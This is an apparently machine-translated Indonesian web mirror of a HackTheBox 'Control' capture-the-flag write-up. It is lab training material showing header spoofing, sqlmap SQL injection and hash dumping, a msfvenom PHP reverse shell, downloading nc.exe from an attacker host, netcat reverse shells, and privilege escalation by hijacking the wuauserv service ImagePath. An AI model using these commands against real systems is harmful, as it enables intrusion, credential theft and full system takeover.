<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤱🏿 📆 👩🏿‍🍳 Retas Kotak. Kontrol Passage. Injeksi SQL dan LPE melalui hak layanan 🥓 🌻 🚣🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Saya terus menerbitkan solusi yang dikirim untuk diproses lebih lanjut dari situs HackTheBox . 
 
 Pada artikel ini, kami menembus sistem melalui inje...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Retas Kotak. Kontrol Passage. Injeksi SQL dan LPE melalui hak layanan</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/499060/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/y_/ag/j1/y_agj1md5zinn0p_o8ucn6nrcfq.png" alt="gambar"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya terus menerbitkan solusi yang dikirim untuk </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diproses lebih lanjut</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dari situs </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kami menembus sistem melalui injeksi SQL, menyelidiki sejarah baris perintah dan meningkatkan hak istimewa kami berkat hak atas layanan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koneksi ke laboratorium adalah melalui VPN. </font><font style="vertical-align: inherit;">Dianjurkan untuk tidak terhubung dari komputer kantor atau dari host di mana data yang penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mesin ini memiliki alamat IP 10.10.10.167, yang saya tambahkan ke / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.167    control.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, kami memindai port terbuka. </font><font style="vertical-align: inherit;">Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan. </font><font style="vertical-align: inherit;">Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 1000 paket per detik.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.167   --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/zg/fy/fu/zgfyfurcecpe-cka_lnykhsrcne.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang, untuk informasi lebih rinci tentang layanan yang beroperasi pada port, kami akan menjalankan pemindaian dengan opsi -A.</font></font><br>
<pre><code class="bash hljs">nmap -A control.htb -p80,135,3306,49667,49666</code></pre><br>
<img src="https://habrastorage.org/webt/eo/ql/7a/eoql7aimt9_z47br5j4v_vmfzai.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tuan rumah menjalankan server web. Mari kita lihat apa yang ada di sana. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jg/gj/eg/jggjeg_agns8gedjluaymnrgmuc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami melihat bahwa ada tautan ke panel admin. Tetapi kami diberitahu bahwa tidak ada tajuk dan kami harus menghubungi melalui proxy. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ty/qu/zn/tyquznnocwmjntlmqzrfa2exkeq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada saat yang sama, dalam kode sumber halaman awal kami menemukan pesan: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ww/rb/ht/wwrbhtb-ecfdehebmwvxaorailq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Membandingkan apa yang Anda butuhkan untuk menggunakan proxy dan alamat yang ditemukan, kami menganggap bahwa Anda harus menjalaninya. Proxy ditampilkan dalam protokol HTTP di header x-forwarded-for. Mari kita buka. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xt/7v/gz/xt7vgzpnuhaxx7wwxt_t1a8mjgm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami berhasil masuk ke halaman admin. Mari kita pergi melalui browser. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k6/9v/jt/k69vjt9fkb-slnguropll7g4yws.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi ketika Anda mencoba melakukan sesuatu, mereka akan melemparkan kami pada halaman dengan pesan proxy. Ini karena kami tidak mengganti header yang ditemukan. Agar tidak melakukan ini setiap kali di Burp Suite di Proxy -&gt; Options tab kita menemukan fungsi "Cocokkan dan Ganti".</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ee/bp/jx/eebpjxadru01wuroipptxqtqx-q.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan tambahkan entri baru yang secara otomatis akan menambahkan header ini ke semua permintaan keluar. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ts/qi/xp/tsqixpvs8glppx4sw6zrt9byo_k.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan menguji bidang pencarian kami menemukan injeksi SQL. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/rl/0n/bn/rl0nbntyfysfaidg_kmx6jrqpk0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk operasi kami menggunakan sqlmap. </font><font style="vertical-align: inherit;">Mari kita simpan permintaan ini ke file (Salin ke file) dan jalankan sqlmap, dengan meneruskan file ini sebagai parameter.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req</code></pre><br>
<img src="https://habrastorage.org/webt/c9/ir/pl/c9irplxxa0exy0byxlfofpmtvk8.png" alt="gambar"><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Entry Point</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Mari kita lihat database apa yang tersedia.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --dbs</code></pre><br>
<img src="https://habrastorage.org/webt/s_/2z/t_/s_2zt_w40pnldgxyt-cmxmzkvfw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari cari tahu kredensial apa yang tersedia. </font><font style="vertical-align: inherit;">Mari kita lihat semua tabel di database mysql.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql --tables</code></pre><br>
<img src="https://habrastorage.org/webt/ke/-v/je/ke-vje10bm0a0wxqsvtbkloeetu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami tertarik dengan tabel pengguna. </font><font style="vertical-align: inherit;">Mari kita cari nama semua kolom.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user --columns</code></pre><br>
<img src="https://habrastorage.org/webt/19/gw/or/19gworxp_r4qy1kxbey7yvbtuko.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dari semua kolom, yang paling menarik adalah Pengguna dan Kata Sandi. </font><font style="vertical-align: inherit;">Kami belajar apa yang ada di dalamnya.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user -C User,Password --dump</code></pre><br>
<img src="https://habrastorage.org/webt/e-/76/b4/e-76b4pv25daqhkvxf-zwhqha1g.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Basis data berisi beberapa pengguna. </font><font style="vertical-align: inherit;">Sqlmap menawarkan untuk memecahkan hash. </font><font style="vertical-align: inherit;">Kami memilih serangan kamus, menunjukkan bahwa kami ingin menggunakan kamus kami dan menulis path ke rockyou. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/og/fp/us/ogfpusgoxax5y4oby4r4isautx8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah beberapa detik, kami akan diberikan tabel dengan nama pengguna dan hash kata sandi mereka. </font><font style="vertical-align: inherit;">Jika sqlmap dapat memecahkan kata sandi, itu akan menunjukkannya di sebelah hash dalam tanda kurung. </font><font style="vertical-align: inherit;">Seperti yang Anda lihat, kami memiliki kredensial hector pengguna. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3l/wh/pp/3lwhppkhebq6-zciqhxufbergyg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya tidak bisa mendapatkan shell menggunakan sqlmap, tetapi menulis file keluar. </font><font style="vertical-align: inherit;">Ayo posting web berjalan. </font><font style="vertical-align: inherit;">Pertama, kami menghasilkan beban meterpreter dalam format PHP.</font></font><br>
<pre><code class="bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.82 LPORT=4321 -f raw &gt; r.php<font></font>
cat r.php | xclip -selection clipboard &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; r.php &amp;&amp; xclip -selection clipboard -o &gt;&gt; r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang tulis menggunakan sqlmap ke direktori server web.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --file-write=/home/ralf/tmp/r.php --file-dest=C:/inetpub/wwwroot/r.php</code></pre><br>
<img src="https://habrastorage.org/webt/f-/ov/hr/f-ovhrbjd12vmuczfbltop8nzya.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
File berhasil ditulis. </font><font style="vertical-align: inherit;">Jalankan pendengar. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/n_/8-/ql/n_8-qly45zo-_ihgxv9v54g5fwu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan buka file Anda di server web.</font></font><br>
<pre><code class="bash hljs">curl http://control.htb/r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di jendela Metasploit, kami mengamati koneksi yang berhasil. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/bp/yy/qybpyydcw15sv7zk5borirt75jc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pergi ke sesi ini. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ah/fu/3f/ahfu3f12oacub1nb_pbc4nu0flg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi di sini masalahnya, kita tidak bisa menjalankan perintah melalui shell. </font><font style="vertical-align: inherit;">Mari kita coba untuk memotong kunci dengan membuat proses PowerShell dalam mode interaktif (-i) tersembunyi dari tampilan (-H) dengan meneruskan perintah kita sebagai parameter (-a). </font><font style="vertical-align: inherit;">Mari cari tahu di bawah pengguna mana kami bekerja.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tg/c1/ph/tgc1photow2juvshqy_imh2wop0.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PENGGUNA</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami memiliki kredensial Hector, kami akan mencari tahu apakah ada pengguna seperti itu dalam sistem. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4r/tw/9h/4rtw9hec22vofi3vvcjfn2bgqza.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ada pengguna seperti itu! </font><font style="vertical-align: inherit;">Tapi pertama-tama, cari tahu nama mobilnya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_0/q1/yd/_0q1ydmzwb0jg10dxhfcd5gdszm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami memiliki nama pengguna, kata sandi, domain dan nama mesin. </font><font style="vertical-align: inherit;">Sekarang mari kita periksa apakah kredensial yang kami terima sesuai. </font><font style="vertical-align: inherit;">Untuk melakukan ini, jalankan "whoami" atas nama Hector.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/f7/zv/gz/f7zvgzzrv5rymzoknsodblm8qqw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baik. </font><font style="vertical-align: inherit;">Ayo ambil cangkangnya. </font><font style="vertical-align: inherit;">Jalankan server web pada host lokal.</font></font><br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan unggah ke host Netcat jarak jauh.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.82/nc.exe -o C:\\Users\\Hector\\Documents\\nc.exe }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang buka port 5432. </font><font style="vertical-align: inherit;">nc -lvp 5432 dan lakukan koneksi balik dari host jarak jauh.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Hector\\Documents\\nc.exe -e powershell 10.10.15.82 5432 }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami mengambil pengguna.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/wu/-v/z6wu-vdgfchbqaobjsq83pdpdpe.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AKAR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lebih jauh, ketika kami mencoba mengunggah salah satu cara mengumpulkan informasi dari host ke host (seperti </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerUp</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JAWS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinPEAS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), kami melihat bahwa bek menghapusnya. </font><font style="vertical-align: inherit;">Tetapi WinPEAS memiliki </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">versi kelelawar</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> yang tidak dapat dihapus. </font><font style="vertical-align: inherit;">Kami mengunggahnya ke host dan menjalankannya. </font><font style="vertical-align: inherit;">Selanjutnya hanya perlu meninjau informasi yang dikumpulkan dengan hati-hati. </font><font style="vertical-align: inherit;">Dan kami menemukan file yang menarik ConsoleHost_history.txt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k3/oe/z4/k3oez4vknoc6njwzz0tvs_wav8i.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lihat apa isinya.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wy/pr/av/wypravr1cr2pa2im8on8yl34rew.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tim-tim ini adalah satu-satunya yang kami miliki. </font><font style="vertical-align: inherit;">Cmdlet Get-Acl mengambil objek yang mewakili deskriptor keamanan untuk file atau sumber daya. </font><font style="vertical-align: inherit;">Deskriptor keamanan berisi daftar kontrol akses sumber daya (ACL). </font><font style="vertical-align: inherit;">ACL berisi izin yang diperlukan oleh pengguna dan grup pengguna untuk mengakses sumber daya. </font><font style="vertical-align: inherit;">Jadi, saya memutuskan bahwa jalur solusi terletak pada layanan dan akses ke sana. </font><font style="vertical-align: inherit;">Mari kita serahkan semua layanan dan izin Hector kepada mereka.</font></font><br>
<br>
<pre><code class="bash hljs">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="hljs-string">"Hector Users Path"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Melihat melalui output, kami melihat bahwa Hector memiliki hak penuh untuk layanan pembaruan Windows - wuauserv. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sp/je/pk/spjepkdg3e1zsisqo8vhvz_1gmk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Layanan dalam sistem operasi Windows dijalankan dengan hak istimewa Sistem. </font><font style="vertical-align: inherit;">Saat mendaftarkan layanan di sistem, jalur ke file yang dapat dieksekusi layanan dilindungi dalam atribut ImagePath. </font><font style="vertical-align: inherit;">Mari kita ubah nilai atribut ini dan muatkan shell.</font></font><br>
<pre><code class="bash hljs">reg add <span class="hljs-string">"HKLM\System\CurrentControlSet\Services\wuauserv"</span> /v ImagePath /t REG_SZ /d <span class="hljs-string">"C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang mulai layanan pembaruan.</font></font><br>
<pre><code class="bash hljs">start-service wuauserv</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mendapatkan shell dengan hak istimewa maksimal. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/im/w1/tq/imw1tqnkohjh-qs-nvwbuggywoy.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Di sana Anda dapat menemukan materi yang menarik, kursus yang digabungkan, serta perangkat lunak. </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id499048/index.html">Sol Levante: bagaimana mereka melakukan anime dalam 4K dan HDR untuk Netflix</a></li>
<li><a href="../id499052/index.html">Penyimpanan data eksternal: dari zaman IBM 1311 hingga saat ini. Bagian 2</a></li>
<li><a href="../id499054/index.html">Pemimpin di tempat baru: instruksi bertahan hidup</a></li>
<li><a href="../id499056/index.html">Bagaimana Amazon diatur</a></li>
<li><a href="../id499058/index.html">Siapa yang terlibat dalam audio yang dalam dan mengapa itu diperlukan</a></li>
<li><a href="../id499062/index.html">Masalah fisika kecil</a></li>
<li><a href="../id499064/index.html">Pemahaman kontekstual alternatif menggunakan model bahasa statistik</a></li>
<li><a href="../id499068/index.html">Mendefinisikan Parameter Transformasi Awan Titik</a></li>
<li><a href="../id499070/index.html">ПШЕ AndroidStudio atau cara menggunakan VCS Tools secara penuh</a></li>
<li><a href="../id499086/index.html">Cluster Rumah Dask</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>